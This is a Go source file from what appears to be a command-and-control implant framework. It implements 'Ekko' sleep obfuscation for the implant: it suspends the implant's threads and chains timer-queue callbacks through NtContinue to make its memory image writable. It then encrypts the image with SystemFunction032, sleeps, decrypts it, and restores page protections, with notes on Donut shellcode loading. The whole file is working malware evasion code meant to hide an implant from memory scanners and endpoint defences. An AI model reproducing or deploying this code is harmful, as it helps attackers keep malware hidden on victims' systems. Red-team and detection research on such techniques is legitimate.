package ekko

import (
	"crypto/rand"
	"errors"
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9

	// Just what we need: suspend/resume + query for the start-address check.
	threadAccess = windows.THREAD_SUSPEND_RESUME | windows.THREAD_QUERY_INFORMATION | windows.THREAD_GET_CONTEXT

	// CONTEXT_CONTROL on amd64. GetThreadContext after SuspendThread forces
	// the kernel to actually commit the suspension before we touch memory.
	contextControlAMD64 = 0x00100001
)

var (
	// kernel32
	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
	procSignalObjectAndWait   = kernel32dll.NewProc("SignalObjectAndWait")
	procNtResumeProcess       = ntdll.NewProc("NtResumeProcess")
	procGetThreadContext      = kernel32dll.NewProc("GetThreadContext")
	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
	procSetEvent              = kernel32dll.NewProc("SetEvent")
	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")
	procDeleteTimerQueueEx    = kernel32dll.NewProc("DeleteTimerQueueEx")

	//ntdll
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue               = ntdll.NewProc("NtContinue")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	//Advapi32
	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
)

// Where the implant is loaded and which thread is Go's main thread, found once
// at startup. This avoids GetModuleHandle(NULL), which returns the host EXE when
// the implant is shellcode, and reads no PE headers, which Donut wipes.
var (
	implantBase, implantSize uintptr
	implantErr               error
	mainTID                  uint32 // Go runs package init on its main thread
)

func init() {
	mainTID = windows.GetCurrentThreadId()
	// mainTID is a global, so its address is inside the implant image wherever it was loaded.
	implantBase, implantSize, implantErr = implantImage(uintptr(unsafe.Pointer(&mainTID)))
}

func EkkoSleep(sleepTime uint64) error {

	if implantErr != nil {
		return implantErr
	}

	// Pin the goroutine to the current OS thread for the entire duration of
	// the sleep. Without this, the Go scheduler can migrate the goroutine to
	// a different M between iterations of the suspend loop, causing
	// GetCurrentThreadId() to return a stale TID and — on the next iteration
	// — we call SuspendThread on the very thread we are currently running on.
	// That is exactly the hang scenario we saw in Process Hacker: one thread
	// suspended, stack frozen inside NtSuspendThread, inside EkkoSleep.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	currentProcessID := uint32(windows.GetCurrentProcessId())
	currentTID := windows.GetCurrentThreadId()

	// Take a snapshot of all running threads in the system
	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThreadSnapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Retrieve information about the first thread in the snapshot
	err = windows.Thread32First(hThreadSnapshot, &te32)
	if err != nil {
		return err
	}

	var peers []windows.Handle

	for {
		if te32.OwnerProcessID == currentProcessID && te32.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(threadAccess, false, te32.ThreadID)
			if openErr == nil {
				var dwStartAddress, size uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					ThreadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&dwStartAddress)),
					unsafe.Sizeof(dwStartAddress),
					uintptr(unsafe.Pointer(&size)),
				)

				// Threads that start inside the implant, plus Go's main thread: under
				// Donut it starts in Donut's loader, outside the implant. One OR in one
				// pass, so no thread is listed (and suspended) twice.
				if (dwStartAddress >= implantBase && dwStartAddress < implantBase+implantSize) || te32.ThreadID == mainTID {
					// {{if .Config.Debug}}
					log.Printf("[ekko] TEMP peer   tid %d start %#x", te32.ThreadID, dwStartAddress)
					// {{end}}
					peers = append(peers, hThread) // stays open; the chain suspends it
				} else {
					// {{if .Config.Debug}}
					log.Printf("[ekko] TEMP skip   tid %d start %#x", te32.ThreadID, dwStartAddress)
					// {{end}}
					windows.CloseHandle(hThread)
				}
			}
		}

		// ALWAYS advance — never `continue` without advancing, or we infinite-loop.
		if err = windows.Thread32Next(hThreadSnapshot, &te32); err != nil {
			break // No more threads
		}
	}

	ekkoErr := ekko(sleepTime, peers)
	for _, h := range peers {
		windows.CloseHandle(h)
	}
	return ekkoErr
}

// chainTail is the non-CONTEXT data the timer chain points at. It lives in the
// VirtualAlloc block right after the CONTEXTs. Never store a pointer to Go
// memory in it: the GC doesn't scan the block.
type chainTail struct {
	Img, Key UString
	KeyBuf   [16]byte
	OldProt  uint32 // VirtualProtect writes a DWORD
}

func ekko(sleepTime uint64, peers []windows.Handle) error {

	// Snapshot the image's page protections now, so the chain can put back exactly these.
	regions, err := imageRegions(implantBase, implantSize)
	if err != nil {
		return err
	}

	// {{if .Config.Debug}}
	// TEMP diagnostics for the shellcode crash; remove before the PR. Everything
	// here runs before the chain, so the log reaches the file even if it crashes.
	log.Printf("[ekko] TEMP implant %#x +%#x, mainTID %d, G1 tid %d, %d peers", implantBase, implantSize, mainTID, windows.GetCurrentThreadId(), len(peers))
	for _, r := range regions {
		log.Printf("[ekko] TEMP region %#x +%#x prot %#x", r.base, r.size, r.prot)
	}
	// Does this view accept the protections the chain asks for? Probe the last
	// region (read-only data the beacon doesn't touch), then put it back.
	{
		last := regions[len(regions)-1] // never empty: the walk always covers [base, end)
		for _, p := range []uint32{windows.PAGE_READWRITE, windows.PAGE_WRITECOPY} {
			var old uint32
			perr := windows.VirtualProtect(last.base, last.size, p, &old)
			log.Printf("[ekko] TEMP probe VirtualProtect(%#x +%#x, %#x) err=%v", last.base, last.size, p, perr)
			if perr == nil {
				windows.VirtualProtect(last.base, last.size, old, &old)
			}
		}
	}
	// {{end}}

	// Everything the timer thread reads or writes lives in one VirtualAlloc
	// block: it never moves, the GC never frees it, and it's page-aligned, so
	// every CONTEXT is 16-byte aligned. It's outside the image, so it stays
	// readable while the image is encrypted.
	nCtx := 2*len(peers) + len(regions) + 9 // 2n+R+7 steps + scratch + capture
	ctxBytes := uintptr(nCtx) * unsafe.Sizeof(CONTEXT{})
	base, err := windows.VirtualAlloc(0, ctxBytes+unsafe.Sizeof(chainTail{}), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return err
	}
	defer windows.VirtualFree(base, 0, windows.MEM_RELEASE)

	ctxs := unsafe.Slice((*CONTEXT)(unsafe.Pointer(base)), nCtx)
	t := (*chainTail)(unsafe.Pointer(base + ctxBytes))
	buf := ctxs[:nCtx-2]       // the chain steps
	scratch := &ctxs[nCtx-2]   // GetThreadContext's output: we want the sync, not the data
	CtxThread := &ctxs[nCtx-1] // RtlCaptureContext writes the timer thread's registers here
	scratch.ContextFlags = contextControlAMD64

	rand.Read(t.KeyBuf[:])
	t.Key.Buffer = &t.KeyBuf[0]
	t.Key.Length = uint32(len(t.KeyBuf))

	t.Img.Buffer = (*byte)(unsafe.Pointer(implantBase))
	t.Img.Length = uint32(implantSize)

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = procCreateTimerQueue.Call()

	// Capture, then signal. A timer callback receives (param, fired) and SetEvent
	// only reads the first, so SetEvent can be the callback itself. It's due 1 ms
	// after the capture, and overdue timers run in due-time order on the one timer
	// thread, so it fires only after RtlCaptureContext has returned.
	const captureTimeoutMs = 5000 // generous: the capture normally runs within a few ms
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procSetEvent.Addr(), hEvent, 1, 0, WT_EXECUTEINTIMERTHREAD)
	if ev, _ := windows.WaitForSingleObject(windows.Handle(hEvent), captureTimeoutMs); ev != windows.WAIT_OBJECT_0 {
		// Nothing is suspended or encrypted yet. Wait out any late callback
		// before the deferred VirtualFree releases the block it writes into.
		procDeleteTimerQueueEx.Call(hTimerQueue, uintptr(windows.InvalidHandle))
		windows.CloseHandle(windows.Handle(hEvent))
		return errors.New("ekko: capture timer didn't run")
	}

	// The addresses the chain needs, as the plain integers they become in registers.
	pImg := uint64(uintptr(unsafe.Pointer(&t.Img)))
	pKey := uint64(uintptr(unsafe.Pointer(&t.Key)))
	pOld := uint64(uintptr(unsafe.Pointer(&t.OldProt)))
	pScratch := uint64(uintptr(unsafe.Pointer(scratch)))
	imgBase := uint64(implantBase)
	imgSize := uint64(t.Img.Length)
	self := uint64(windows.CurrentProcess())

	const gapMs = 100 // spacing between phases; steps inside one phase may run in any order

	hReady, _, _ := procCreateEventW.Call(0, 0, 0, 0)

	i := 0
	queue := func(c CONTEXT, phase int) {
		buf[i] = c
		procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(),
			uintptr(unsafe.Pointer(&buf[i])), uintptr(phase*gapMs), 0, WT_EXECUTEINTIMERTHREAD)
		i++
	}

	queue(step(CtxThread, procWaitForSingleObject.Addr(), uint64(hReady), uint64(windows.INFINITE)), 1) // gate
	for _, h := range peers {
		queue(step(CtxThread, procSuspendThread.Addr(), uint64(h)), 2)
	}
	for _, h := range peers {
		queue(step(CtxThread, procGetThreadContext.Addr(), uint64(h), pScratch), 3)
	}
	queue(step(CtxThread, procVirtualProtect.Addr(), imgBase, imgSize, windows.PAGE_READWRITE, pOld), 4)
	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 5)        // encrypt
	queue(step(CtxThread, procWaitForSingleObject.Addr(), self, sleepTime), 6) // sleep
	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 7)        // decrypt
	// put every region back as it was; order inside the phase doesn't matter
	for _, r := range regions {
		queue(step(CtxThread, procVirtualProtect.Addr(), uint64(r.base), uint64(r.size), uint64(r.prot), pOld), 8)
	}
	queue(step(CtxThread, procNtResumeProcess.Addr(), self), 9)
	queue(step(CtxThread, procSetEvent.Addr(), uint64(hEvent)), 10)

	// Signal the gate and start waiting in one kernel call: once the chain runs, G1 has no Go code left.
	procSignalObjectAndWait.Call(hReady, hEvent, uintptr(windows.INFINITE), 0)

	procDeleteTimerQueue.Call(hTimerQueue)
	windows.CloseHandle(windows.Handle(hReady))
	windows.CloseHandle(windows.Handle(hEvent))
	return nil
}

// step returns a copy of base that calls fn(args...) and then returns into the timer dispatcher.
func step(base *CONTEXT, fn uintptr, args ...uint64) CONTEXT {
	c := *base
	c.Rsp -= 8
	c.Rip = uint64(fn)
	for i, r := range []*uint64{&c.Rcx, &c.Rdx, &c.R8, &c.R9}[:len(args)] {
		*r = args[i]
	}
	return c
}

// region is one run of pages in the image that share a protection.
type region struct {
	base, size uintptr
	prot       uint32
}

// imageRegions lists the image's page protections, so the chain can restore
// exactly what the loader set (.text RX, .rdata R, .data RW, ...) instead of
// one protection for everything.
func imageRegions(imageBase, imageSize uintptr) ([]region, error) {
	var out []region
	end := imageBase + imageSize
	for addr := imageBase; addr < end; {
		var mbi windows.MemoryBasicInformation
		if err := windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
			return nil, err
		}
		next := min(mbi.BaseAddress+mbi.RegionSize, end)
		out = append(out, region{addr, next - addr, mbi.Protect})
		addr = next
	}
	return out, nil
}

// implantImage returns the memory allocation that contains addr: the module
// for an EXE, or the buffer Donut mapped the implant into. It walks regions
// while they belong to the same allocation, so it needs no PE headers.
func implantImage(addr uintptr) (base, size uintptr, err error) {
	var mbi windows.MemoryBasicInformation
	if err = windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
		return 0, 0, err
	}
	base = mbi.AllocationBase
	end := base
	for windows.VirtualQuery(end, &mbi, unsafe.Sizeof(mbi)) == nil && mbi.AllocationBase == base {
		end += mbi.RegionSize
	}
	return base, end - base, nil
}
